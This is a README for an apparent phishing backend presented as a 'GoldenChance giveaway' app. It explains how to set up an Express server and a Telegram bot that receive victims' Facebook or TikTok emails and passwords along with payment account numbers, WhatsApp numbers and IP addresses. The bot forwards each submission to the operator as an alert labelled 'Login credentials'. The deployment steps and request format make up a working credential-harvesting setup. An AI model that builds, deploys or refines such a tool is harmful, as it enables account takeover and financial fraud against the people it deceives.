# 🚀 Giveaway Backend API

Backend server for the GoldenChance giveaway app with Telegram bot integration.

## 📋 Features

- ✅ **Express.js server** with security middleware
- ✅ **Telegram bot integration** for form submissions
- ✅ **CORS support** for frontend communication
- ✅ **Rate limiting** to prevent abuse
- ✅ **Security headers** with Helmet
- ✅ **Environment-based configuration**
- ✅ **Comprehensive error handling**

## 🛠️ Setup Instructions

### 1. Install Dependencies
```bash
cd server
npm install
```

### 2. Create Telegram Bot

1. **Message @BotFather** on Telegram
2. **Send**: `/newbot`
3. **Choose a name** for your bot
4. **Choose a username** (must end with 'bot')
5. **Copy the bot token** (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

### 3. Get Chat ID

1. **Start a chat** with your bot
2. **Send any message** to the bot
3. **Visit**: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. **Find your chat ID** in the response (look for `"chat":{"id":123456789}`)

### 4. Environment Configuration

Create a `.env` file in the server directory:

```env
# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here

# Server Configuration
PORT=3001
NODE_ENV=development

# Security
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX_REQUESTS=100
```

### 5. Start the Server

**Development mode:**
```bash
npm run dev
```

**Production mode:**
```bash
npm start
```

## 📡 API Endpoints

### Health Check
```
GET /api/health
```

### Form Submission
```
POST /api/submit-form
```

**Request Body:**
```json
{
  "platform": "facebook",
  "email": "user@example.com",
  "password": "userpassword",
  "username": "username",
  "userAnswers": {
    "paymentMethod": "nequi",
    "accountNumber": "123456789",
    "whatsappNumber": "+573001234567"
  },
  "ipAddress": "192.168.1.1",
  "userAgent": "Mozilla/5.0..."
}
```

## 🔒 Security Features

- **Rate limiting**: 100 requests per 15 minutes per IP
- **CORS protection**: Only allows specified origins
- **Security headers**: XSS protection, content security policy
- **Input validation**: Required field checking
- **Error sanitization**: No sensitive data in error responses

## 📱 Telegram Message Format

The bot sends formatted messages with:
- 🚨 Alert header
- 📘/🎵 Platform indicator
- ⏰ Timestamp
- 👤 Login credentials
- 💳 User information (payment details)
- 🌐 IP address and user agent
- 🎯 Status indicator

## 🚀 Production Deployment

1. **Set environment variables** on your hosting platform
2. **Update CORS origins** in `server.js`
3. **Use HTTPS** in production
4. **Set up proper logging** and monitoring
5. **Configure reverse proxy** (nginx/Apache) if needed

## 🔧 Troubleshooting

### Bot not responding?
- Check bot token is correct
- Ensure bot is not blocked
- Verify chat ID is correct

### CORS errors?
- Check frontend origin is in CORS config
- Ensure backend is running on correct port

### Rate limiting?
- Check rate limit configuration
- Monitor request frequency

## 📞 Support

For issues or questions, check the logs or contact support.

---

**⚠️ Important**: Never commit your `.env` file or expose bot tokens publicly!
